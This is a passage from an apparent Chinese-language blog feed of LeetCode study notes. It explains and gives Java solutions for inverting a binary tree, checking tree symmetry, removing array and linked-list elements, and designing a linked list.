invertTree(root.right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 后序遍历：先递归地翻转左右子树</span></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> invertTree(root.left);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> invertTree(root.right);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 交换左右子树</span></span><br><span class="line">        root.left = right;</span><br><span class="line">        root.right = left;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        ArrayDeque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            <span class="keyword">while</span> (size-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                swap(node);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;deque.offer(node.left);&#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;deque.offer(node.right);&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">temp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><p>人机有话说.<br><strong>DFS 和 BFS 的区别</strong></p><ol><li><strong>遍历顺序</strong><ul><li><strong>DFS（Depth First Search，深度优先搜索）</strong>：优先深入到每个节点的子节点，通常会先访问到某个分支的最底层节点，然后再回溯到上层节点去访问其他分支。常见的 DFS 实现有三种：前序遍历（Preorder）、中序遍历（Inorder）、后序遍历（Postorder）。</li><li><strong>BFS（Breadth First Search，广度优先搜索）</strong>：优先访问每一层的节点，然后再逐层深入。BFS 一般使用队列（<code>Queue</code>）来实现，按层次逐一处理节点。</li></ul></li><li><strong>数据结构</strong><ul><li><strong>DFS</strong>：常用递归或栈来实现，递归会隐式使用系统栈，而非递归的实现需要显式的栈。</li><li><strong>BFS</strong>：通常使用队列来实现，因为它按照层次顺序访问节点。</li></ul></li><li><strong>时间复杂度和空间复杂度</strong><ul><li><strong>时间复杂度</strong>：DFS 和 BFS 的时间复杂度都是 O(n)，其中 nnn 是节点的数量，因为每个节点都需要被访问一次。</li><li><strong>空间复杂度</strong>：DFS 的空间复杂度取决于递归的深度，最坏情况下是 O(h)（树的高度）；BFS 的空间复杂度则是 O(w)，其中 w是树的最大宽度。</li></ul></li></ol><h4 id="对称二叉树"><a href="#对称二叉树" class="headerlink" title="对称二叉树"></a>对称二叉树</h4><p>link：<a href="https://leetcode.cn/problems/symmetric-tree/description/">101. 对称二叉树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>看题目确实觉得很对称啊，看图分析左子树和右子树的遍历顺序，左子树是左右中，那和右子树比较的时候就是右左中.<br>特殊情况优先考虑<br>左空右空-&gt;true<br>左不空右空-&gt;false<br>左空右不空-&gt;false<br>那最后的情况就是左右都不为空了，这时候就需要单独判断.<br>单侧不对称就可以返回false.<br>那么这么比较就只能是后序遍历了.<br>递归秒！</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cmp(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">cmp</span><span class="params">(TreeNode left,TreeNode right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right.val != left.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">last</span> <span class="operator">=</span> cmp(left.left,right.right);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">lastnext</span> <span class="operator">=</span> cmp(left.right,right.left);</span><br><span class="line">        <span class="keyword">return</span> last &amp;&amp; lastnext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>不要else if判断结束之后直接else{return true;}<br>这样做的话没有判断其他剩余的子节点 ，意味着中层节点的值心相等，但是叶子节点的值不通，但仍然判断这种情况为true，这样是不对的.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;二叉树的层序遍历（广度优先遍历）&quot;&gt;&lt;a href=&quot;#二叉树的层序遍历（广度优先遍历）&quot; class=&quot;headerlink&quot; title=&quot;二叉树的层序遍历（广度优先遍历）&quot;&gt;&lt;/a&gt;二叉树的层序遍历（广度优先遍历）&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x2</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x2/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x2/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:08:42.972Z</updated>
    
    <content type="html"><![CDATA[<h4 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h4><p>link：<a href="https://leetcode.cn/problems/remove-element/solutions/1689028/by-carlsun-2-fdc4/">27. 移除元素 - 力扣（LeetCode）</a></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240925141403675.png" alt="image-20240925141403675"></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>1.常规遍历数组，比较vaule值是否相等，若不相等往前拷贝覆盖即可，相等跳过，更新下标（可以理解为数组长度减少）.【时间复杂度O(n) 空间复杂度O(1)】<br>2.快慢指针.快指针遍历进行筛选，慢指针对应常见存储的数组.找到目标vaule后fast和slow指针拉开距离开始遍历维护更新.【时间复杂度O(n) 空间复杂度O(1)】</p><h6 id="拷贝覆盖"><a href="#拷贝覆盖" class="headerlink" title="拷贝覆盖"></a>拷贝覆盖</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">          <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num != val)&#123;</span><br><span class="line">                nums[k] = num;</span><br><span class="line">                k++; </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(slow = <span class="number">0</span>; fast &lt; nums.length; fast++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != val)&#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p>注意多种思路辨析.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;移除元素&quot;&gt;&lt;a href=&quot;#移除元素&quot; class=&quot;headerlink&quot; title=&quot;移除元素&quot;&gt;&lt;/a&gt;移除元素&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/remove-element/solu</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x4</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x4/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x4/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T07:25:05.644Z</updated>
    
    <content type="html"><![CDATA[<h4 id="移除列表元素"><a href="#移除列表元素" class="headerlink" title="移除列表元素"></a>移除列表元素</h4><p>link：<a href="https://leetcode.cn/problems/remove-linked-list-elements/description/">203. 移除链表元素 - 力扣（LeetCode）</a></p><p>首先单向链表是有一个数据域和指针域且在内存中不连续.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241002232434525.png" alt="image-20241002232434525"><br>链表的查找需要从头往后一个个查找【时间复杂度为O(n)】，但是数组查找只需要访问对应元素下标即可【时间复杂度为O(1)】.<br><strong>查找频繁</strong>：数组是更好的选择，因为通过索引访问的时间复杂度是 O(1)，链表则需要遍历.</p><p><strong>插入&#x2F;删除频繁</strong>：链表更适合，因为它可以高效地插入和删除元素，时间复杂度为 O(1)（假设已找到插入或删除位置）。相反，数组在插入和删除时需要移动大量元素，时间复杂度为 O(n).</p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看到题目最第一反应就是常规解法，遍历链表找到target直接进行删除操作.【目标是头节点和不是头节点两种情况】（其实还是想有更优雅的解法 不用单独处理移除头节点的情况）</p><h6 id="直接删除"><a href="#直接删除" class="headerlink" title="直接删除"></a>直接删除</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(head == <span class="literal">null</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(cur.val == val)&#123;</span><br><span class="line">  prev.next = cur.next;</span><br><span class="line">  cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"> prev = cur;</span><br><span class="line"> cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(head.val == val)&#123;</span><br><span class="line">head = head.next;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> head;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="虚拟头节点"><a href="#虚拟头节点" class="headerlink" title="虚拟头节点"></a>虚拟头节点</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">            <span class="comment">//只有头节点</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建虚拟头节点 不用再删除头节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>,head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(prev != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.val == val) &#123;</span><br><span class="line">                cur.next = prev.next;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                cur = prev;</span><br><span class="line">            &#125;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="设计链表"><a href="#设计链表" class="headerlink" title="设计链表"></a>设计链表</h4><p>link：<a href="https://leetcode.cn/problems/design-linked-list/">707. 设计链表 - 力扣（LeetCode）</a></p><p>综合练习链表五大操作的好题目！<br>1.获取链表的index下标节点数值.<br>2.在链表最前面插入节点.<br>3.在链表最后插入节点.<br>4.在链表第index个节点前插入节点.<br>5.删除链表第index个节点. </p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>先从链表需要的元素入手，head，tail，size.<br>考虑虚拟头节点.【优先考虑特殊情况】<br>个人觉得对于单链表更容易操作.(好吧其实就是一个懒蛋😂)</p><h6 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="comment">//定义需要的结构</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode(<span class="type">int</span> val) &#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">size</span>  <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="comment">//如果index不在范围返回-1</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//虚拟头节点的存在 使得返回index+1个节点&quot;=&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++) &#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果index等于0 新插入的节点就为头节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>,val);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//如果index等于链表长度 此时插入的新节点为尾节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(size,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">//如果index大于链表长度 返回null</span></span><br><span class="line">         <span class="keyword">if</span>(index &gt; size) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         size++;</span><br><span class="line">         <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">         <span class="comment">//找到要插入节点的前驱</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index ;i++) &#123;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = prev.next;</span><br><span class="line">        prev.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">     <span class="comment">//同样的判断逻辑</span></span><br><span class="line">     <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     size--;</span><br><span class="line">     <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        prev = prev.next;</span><br><span class="line">     &#125;</span><br><span class="line">     prev.next = prev.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h6><p>用双链表操作时需要注意指针操作的逻辑.<br>head.next &#x3D; tail;<br>tail.next &#x3D; head;<br><strong><code>index &lt; (size - 1) / 2</code> 判断用来决定是从头节点还是尾节点进行遍历，这样做是为了提高查找效率</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 